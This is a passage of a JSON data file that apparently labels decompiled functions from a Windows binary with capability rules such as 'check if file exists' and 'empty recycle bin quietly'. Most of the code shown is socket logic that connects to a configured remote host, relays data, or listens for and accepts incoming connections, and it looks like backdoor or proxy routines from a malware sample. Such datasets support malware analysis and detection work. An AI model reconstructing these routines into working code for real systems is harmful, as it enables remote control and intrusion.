= puVar3[0xe];\n                uStack20 = puVar3[0xf];\n                var_1ch = puVar3[6];\n                iVar1 = puVar3[7];\n                in = iVar1;\n                uStack24 = puVar3[8];\n                uStack20 = puVar3[9];\n                sub.wsock32.dll_inet_ntoa(in_EAX);\n                fcn.00405818();\n                puVar3 = puVar3 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar1;\n        in_stack_fffff954 = s;\n        sub.wsock32.dll_closesocket();\n    }\n    *in_FS_OFFSET = in_stack_fffff954;\n    fcn.00405530(0x47345c);\n    return;\n}\n",
        "token_count": 805
    },
    "00473d30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00473d30(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY100;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint lpNumberOfBytesRead;\n    uint *lpBuffer;\n    uint var_4h;\n    \n    puStack32 = 0x473d47;\n    lpBuffer = param_2;\n    fcn.004059cc();\n    uStack36 = 0x473dd2;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(0x80000000, 1, 0, 3, 0, 0);\n    iVar2 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    if (iVar2 != -1) {\n        uVar1 = sub.kernel32.dll_GetFileSize_1(iVar2, 0);\n        fcn.00406928(uVar1);\n        sub.kernel32.dll_ReadFile_1(iVar2, *lpBuffer, uVar1, &fcn.00473d30::lpNumberOfBytesRead, 0);\n        sub.kernel32.dll_CloseHandle_1();\n        iStackY100 = iVar2;\n    }\n    *in_FS_OFFSET = iStackY100;\n    fcn.00405530(0x473dd9);\n    return;\n}\n",
        "token_count": 348
    },
    "00480aa8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00480aa8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != -1) {\n        *(in_EAX + 0x44) = param_2;\n        return;\n    }\n    *(in_EAX + 0x48) = 0xffffffff;\n    return;\n}\n",
        "token_count": 85
    },
    "00480fc4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00480fc4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != -1) {\n        *(in_EAX + 0x44) = param_2;\n        return;\n    }\n    *(in_EAX + 0x48) = 0xffffffff;\n    return;\n}\n",
        "token_count": 85
    },
    "004812bc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004812bc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar auStack372 [8];\n    uint uStack364;\n    uint uStack360;\n    uint *puStack356;\n    uint uStack352;\n    uint uStack348;\n    uchar *puStack344;\n    uint var_150h;\n    uint var_134h;\n    uint var_130h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack344 = 0x4812d0;\n    fcn.004059cc();\n    uStack348 = 0x48136e;\n    uStack352 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffea0;\n    puStack356 = &fcn.004812bc::var_150h;\n    uStack360 = 0x4812ed;\n    puStack344 = &stack0xfffffffc;\n    uStack360 = fcn.004059dc();\n    uStack364 = 0x4812f3;\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1();\n    if (iVar2 == -1) {\n        var_10h = 0;\n        var_ch = 0;\n        *in_FS_OFFSET = uStack360;\n        uStack352 = 0x481375;\n        puStack356 = 0x48136d;\n        fcn.00405530();\n        return;\n    }\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe8c;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 364
    },
    "00482900": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00482900 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    var_420h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1080 = 0x482a78;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    fcn.00405728();\n    fcn.00405b28(&var_420h);\n    fcn.00405a44();\n    uVar1 = fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    uVar2 = fcn.00409ee4();\n    fcn.00482824();\n    iVar3 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar3 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00403af4();\n    var_1ch._0_2_ = 2;\n    var_18h = sub.wsock32.dll_inet_addr(uVar1);\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    if (var_18h == -1) {\n        iVar4 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar4 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_18h = ***(iVar4 + 0xc);\n    }\n    iVar4 = sub.wsock32.dll_connect(iVar3, &var_1ch, 0x10);\n    if (iVar4 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00482780();\n    sub.wsock32.dll_recv(iVar3, &var_41ch, 0x400, 0);\n    fcn.00405728();\n    sub.kernel32.dll_Sleep_2(1000);\n    sub.wsock32.dll_closesocket(iVar3);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 648
    },
    "00482c5c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00482c5c noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack56 = 0x482c81;\n    fcn.00405fe8();\n    uStack60 = 0x482dd3;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    uStack72 = 0x482d91;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack56 = &stack0xfffffffc;\n    fcn.00408568();\n    fcn.004055c8();\n    uVar2 = *(arg_8h + 4);\n    fcn.00403af4();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 0);\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    var_1ch._0_2_ = 2;\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    uVar2 = fcn.004059dc();\n    var_18h = sub.wsock32.dll_inet_addr(uVar2);\n    if (var_18h == -1) {\n        uVar2 = fcn.004059dc();\n        iVar3 = sub.wsock32.dll_gethostbyname(uVar2);\n        if (iVar3 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_18h = ***(iVar3 + 0xc);\n    }\n    iVar3 = sub.wsock32.dll_connect(iVar1, &fcn.00482c5c::var_1ch, 0x10);\n    if (iVar3 == 0) {\n        fcn.00409d78(0x482e00, var_4h, 0x482dec);\n        fcn.004058e0(0);\n        fcn.00475d98();\n        sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 681
    },
    "00483c98": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00483c98 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack1132;\n    uint uStack1128;\n    uchar *puStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint var_444h;\n    uint var_440h;\n    uint var_43ch;\n    int32_t var_438h;\n    uint var_42ch;\n    int32_t *var_2ch;\n    int32_t var_28h;\n    uint var_20h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1124 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack1112 = 0x483ccc;\n    fcn.00405fe8();\n    uStack1116 = 0x483f2b;\n    uStack1120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffba0;\n    uStack1128 = 0x483ec5;\n    uStack1132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffb94;\n    puStack1112 = &stack0xfffffffc;\n    var_2ch = fcn.0041c028();\n    fcn.00408568();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.00461360();\n    fcn.004055c8();\n    fcn.0041c144();\n    var_28h = sub.wsock32.dll_socket(2, 1, 0);\n    if (var_28h == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    var_43ch._0_2_ = 2;\n    var_43ch._2_2_ = sub.wsock32.dll_htons(**0x4959d8);\n    var_438h = sub.wsock32.dll_inet_addr(**0x495b34);\n    if (var_438h == -1) {\n        iVar1 = sub.wsock32.dll_gethostbyname(**0x495b34);\n        if (iVar1 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_438h = ***(iVar1 + 0xc);\n    }\n    sub.wsock32.dll_connect(var_28h, &fcn.00483c98::var_43ch, 0x10);\n    iVar1 = sub.wsock32.dll_recv(var_28h, &fcn.00483c98::var_42ch, 0x400, 0);\n    if (iVar1 != -1) {\n        fcn.004058e0(var_ch, 0x483f5c, var_8h, 0x483f48);\n        fcn.00475e38();\n        uVar3 = 0x400;\n        iVar1 = sub.wsock32.dll_recv(var_28h, &fcn.00483c98::var_42ch, 0x400, 0);\n        if (iVar1 != -1) {\n            fcn.0041b750(0, 0);\n            while( true ) {\n                fcn.00403af4();\n                iVar1 = (**(*var_2ch + 0xc))();\n                if (iVar1 < 1) break;\n                iVar2 = sub.wsock32.dll_send(uVar3, &fcn.00483c98::var_42ch, iVar1, 0);\n                if (iVar2 == -1) break;\n                iVar2 = sub.wsock32.dll_recv(var_28h, &fcn.00483c98::var_42ch, 0x400, 0);\n                if ((iVar2 == -1) || (iVar1 < 1)) break;\n            }\n        }\n    }\n    sub.wsock32.dll_shutdown(var_28h, 2);\n    sub.wsock32.dll_closesocket(var_28h);\n    fcn.00404650();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 1003
    },
    "004841f4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004841f4 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack1076;\n    uint uStack1072;\n    uchar *puStack1068;\n    uint var_418h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1068 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack1072 = 0x484303;\n    uStack1076 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1076;\n    fcn.004055c8();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar1 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00403af4();\n    var_18h._0_2_ = 2;\n    var_14h = sub.wsock32.dll_inet_addr(arg_8h);\n    var_18h._2_2_ = sub.wsock32.dll_htons(0x50);\n    if (var_14h == -1) {\n        iVar2 = sub.wsock32.dll_gethostbyname(arg_8h);\n        if (iVar2 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_14h = ***(iVar2 + 0xc);\n    }\n    iVar2 = sub.wsock32.dll_connect(iVar1, &var_18h, 0x10);\n    if (iVar2 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00475e38();\n    sub.wsock32.dll_recv(iVar1, &var_418h, 0x400, 0);\n    fcn.00405728();\n    sub.kernel32.dll_Sleep_2(1000);\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 539
    },
    "00486780": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00486780(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint name;\n    int32_t var_ch;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x4868b2;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    *0x49f3a8 = sub.wsock32.dll_socket(2, 1, 0);\n    if (*0x49f3a8 != -1) {\n        name._0_2_ = 2;\n        name._2_2_ = sub.wsock32.dll_htons(**0x4959d8);\n        var_ch = sub.wsock32.dll_inet_addr(**0x495b34);\n        if (var_ch == -1) {\n            iStack76 = **0x495b34;\n            iVar1 = sub.wsock32.dll_gethostbyname();\n            if (iVar1 == 0) goto code_r0x00486897;\n            var_ch = ***(iVar1 + 0xc);\n        }\n        sub.wsock32.dll_connect(*0x49f3a8, &name, 0x10);\n        sub.wsock32.dll_recv(*0x49f3a8, 0x49d3a8, 0x1fff, 0);\n        fcn.00403af4();\n        fcn.00409d78();\n        fcn.00405864();\n        fcn.00475e38();\n        iStack76 = *0x49f3a8;\n        sub.wsock32.dll_recv();\n        fcn.00403af4();\n    }\ncode_r0x00486897:\n    *in_FS_OFFSET = iStack76;\n    fcn.00405554(0x4868b9);\n    return;\n}\n",
        "token_count": 461
    },
    "0048766c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0048766c noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t *unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack124 = 0x4876a3;\n    fcn.00405fe8();\n    uStack128 = 0x487886;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.00408568();\n    uVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    fcn.00403af4();\n    var_30h._0_2_ = 2;\n    var_30h._2_2_ = sub.wsock32.dll_htons(var_10h & 0xffff);\n    var_2ch = 0;\n    iVar2 = sub.wsock32.dll_bind(uVar1, &fcn.0048766c::var_30h, 0x10);\n    if (iVar2 == 0) {\n        iVar2 = sub.wsock32.dll_listen(uVar1, 5);\n        if (iVar2 == 0) {\n            uVar5 = 0;\n            uVar3 = var_10h;\n            fcn.00409e64(var_10h);\n            fcn.00405864(uVar3, uVar5);\n            fcn.00488270();\n            fcn.00409d78();\n            uVar4 = 0;\n            uVar5 = 0;\n            fcn.00409e64(var_10h);\n            fcn.00487914(uVar5, uVar4);\n            while( true ) {\n                var_20h = 0x10;\n                var_18h = sub.wsock32.dll_accept(uVar1, &fcn.0048766c::var_40h, &fcn.0048766c::var_20h);\n                if (var_18h == 0xffffffff) break;\n                unaff_EBX = sub.kernel32.dll_LocalAlloc_1(0x40, 0x10);\n                *unaff_EBX = var_10h;\n                fcn.00405584();\n                fcn.00405584();\n                unaff_EBX[3] = var_18h;\n                uVar5 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00487158, unaff_EBX, 0, &fcn.0048766c::var_1ch);\n                sub.kernel32.dll_CloseHandle_1(uVar5);\n                sub.kernel32.dll_Sleep_2();\n            }\n            uVar3 = *unaff_EBX;\n            uVar1 = 0;\n            fcn.00409e64(uVar3);\n            fcn.00405864(uVar3, uVar1);\n            fcn.00488270();\n            uVar3 = *unaff_EBX;\n            uVar1 = 0;\n            fcn.00409e64(uVar3);\n            fcn.00487cc8(uVar3, uVar1);\n            goto code_r0x00487856;\n        }\n    }\n    uVar3 = *unaff_EBX;\n    uVar1 = 0;\n    fcn.00409e64(uVar3);\n    fcn.00405864(uVar3, uVar1);\n    fcn.00488270();\n    uVar3 = *unaff_EBX;\n    uVar1 = 0;\n    fcn.00409e64(uVar3);\n    fcn.00487cc8(uVar3, uVar1);\ncode_r0x00487856:\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 1026
    },
    "00489a84": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00489a84 noreturn (void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_414h;\n    int32_t var_410h;\n    uint var_404h;\n    int32_t *var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    uStack1080 = 0x489c81;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    var_4h = fcn.0041c028();\n    fcn.00461360();\n    fcn.00405584();\n    fcn.0041c144();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 0);\n    if (iVar1 != -1) {\n        var_414h._0_2_ = 2;\n        var_414h._2_2_ = sub.wsock32.dll_htons(**0x4959d8);\n        var_410h = sub.wsock32.dll_inet_addr(**0x495b34);\n        if (var_410h == -1) {\n            iVar2 = sub.wsock32.dll_gethostbyname(**0x495b34);\n            if (iVar2 == 0) goto code_r0x00489c46;\n            var_410h = ***(iVar2 + 0xc);\n        }\n        sub.wsock32.dll_connect(iVar1, &var_414h, 0x10);\n        uVar5 = 0;\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            uVar4 = 0x489c98;\n            fcn.00409d78(0x489cac, *(in_EAX + 0x48), 0x489c98);\n            fcn.004058e0(0);\n            fcn.00475e38();\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                fcn.0041b750(0, 0);\n                while( true ) {\n                    fcn.00403af4();\n                    iVar2 = (**(*var_4h + 0xc))();\n                    if (iVar2 < 1) break;\n                    iVar3 = sub.wsock32.dll_send(uVar5, &var_404h, iVar2, 0, iVar1);\n                    if (iVar3 == -1) break;\n                    iVar3 = sub.wsock32.dll_recv(uVar4, &var_404h, 0x400, 0);\n                    if ((iVar3 == -1) || (iVar2 < 1)) break;\n                }\n            }\n        }\n    }\ncode_r0x00489c46:\n    sub.wsock32.dll_shutdown(iVar1, 2);\n    sub.wsock32.dll_closesocket(iVar1);\n    fcn.00404650();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 749
    },
    "0048cf7c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0048cf7c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    int32_t hObject;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uStack52 = 0;\n    uStack56 = 0;\n    uStack60 = 3;\n    uStack64 = 0;\n    uStack68 = 1;\n    uStack72 = 0x80000000;\n    uStack76 = 0x48cfa5;\n    uStack76 = fcn.004059dc();\n    puStack80 = 0x48cfab;\n    iVar2 = sub.kernel32.dll_CreateFileA_1();\n    if (iVar2 == -1) {\n        return var_1h;\n    }\n    uStack84 = 0x48d026;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &fcn.0048cf7c::var_1h + 1;\n    hObject = iVar2;\n    iVar3 = sub.kernel32.dll_GetFileTime\n                      (iVar2, &fcn.0048cf7c::lpCreationTime, &fcn.0048cf7c::lpLastAccessTime, \n                       &fcn.0048cf7c::lpLastWriteTime);\n    if (iVar3 != 0) {\n        cVar1 = fcn.0048cf3c();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0048cf3c();\n            if (cVar1 != '\\0') {\n                cVar1 = fcn.0048cf3c();\n                if (cVar1 != '\\0') {\n                    var_1h._0_1_ = 1;\n                    goto code_r0x0048d00c;\n                }\n            }\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x0048d00c:\n    *in_FS_OFFSET = iVar2;\n    uVar4 = sub.kernel32.dll_CloseHandle_1(hObject, 0x48d02d);\n    return uVar4;\n}\n",
        "token_count": 622
    },
    "00404418": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint fcn.00404418(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetKeyboardType(0);\n    if (iVar1 == 7) {\n        uVar2 = sub.user32.dll_GetKeyboardType(1);\n        if (((uVar2 & 0xff00) == 0xd00) || ((uVar2 & 0xff00) == 0x400)) {\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 135
    },
    "00404924": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404924(uint param_1, uint8_t *param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    \n    uVar3 = 0;\n    uVar6 = 0;\n    uVar4 = *param_2;\n    piVar2 = in_EAX;\n    do {\n        puVar1 = *(*piVar2 + -0x38);\n        if (puVar1 != NULL) {\n            uVar6 = uVar6 & 0xffff0000 | *puVar1;\n            piVar5 = puVar1 + 3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                if (*(piVar5 + 6) == uVar4) {\n                    while (((*(uVar3 + 6 + piVar5) ^ param_2[uVar3]) & 0xdf) == 0) {\n                        uVar3 = uVar3 - 1;\n                        if (uVar3 == 0) {\n                            piVar2 = *piVar5 + in_EAX;\n                            goto code_r0x00404970;\n                        }\n                    }\n                    uVar4 = *param_2;\n                    uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                }\n                piVar5 = uVar3 + 7 + piVar5;\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        piVar2 = *(*piVar2 + -0x24);\n    } while (piVar2 != NULL);\ncode_r0x00404970:\n    return CONCAT44(in_EAX, piVar2);\n}\n",
        "token_count": 426
    },
    "0040995c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040995c(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    \n    uVar2 = param_1 ^ 0xffffffff;\n    iVar1 = in_EAX + param_1 + -8;\n    iVar5 = param_2 + param_1 + -8;\n    iVar3 = uVar2 + 9;\n    if (iVar3 == 0 || SCARRY4(uVar2, 9) != iVar3 < 0) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        uVar6 = iVar3 + iVar1 & 3;\n        iVar3 = (uVar2 + 0xd) - uVar6;\n        iVar4 = iVar3;\n        if (iVar3 == 0 || uVar2 + 0xd < uVar6) {\n            do {\n                if (*(iVar4 + iVar1) != *(iVar4 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 4 + iVar1) != *(iVar4 + 4 + iVar5)) {\n                    return 0;\n                }\n                iVar3 = iVar4 + 8;\n                if (iVar3 != 0 && SCARRY4(iVar4, 8) == iVar3 < 0) break;\n                if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 0xc + iVar1) != *(iVar4 + 0xc + iVar5)) {\n                    return 0;\n                }\n                bVar7 = SCARRY4(iVar3, 8);\n                iVar3 = iVar4 + 0x10;\n                iVar4 = iVar3;\n            } while (iVar3 == 0 || bVar7 != iVar3 < 0);\n        }\n    }\n    if (iVar3 < 5) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 4;\n    }\n    if (iVar3 < 7) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 2;\n    }\n    if ((iVar3 < 8) && (*(in_EAX + param_1 + -1) != *(param_2 + param_1 + -1))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 608
    },
    "0042c9d0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0042c9d0(int32_t *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch_00;\n    uint32_t uVar2;\n    uint extraout_ECX;\n    uint8_t *puVar3;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    int32_t var_4h_2;\n    int32_t var_8h_2;\n    uint var_10h_5;\n    uint var_10h_3;\n    uint var_18h;\n    uint var_1ch_2;\n    uint var_1ch;\n    uint var_10h;\n    uint var_8h;\n    uchar auStack180 [4];\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t iStack168;\n    uchar *puStack164;\n    uint arg_ch_01;\n    uint arg_10h;\n    uint uStack144;\n    uint uStack140;\n    uchar *puStack136;\n    int32_t iStack132;\n    uint8_t *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint 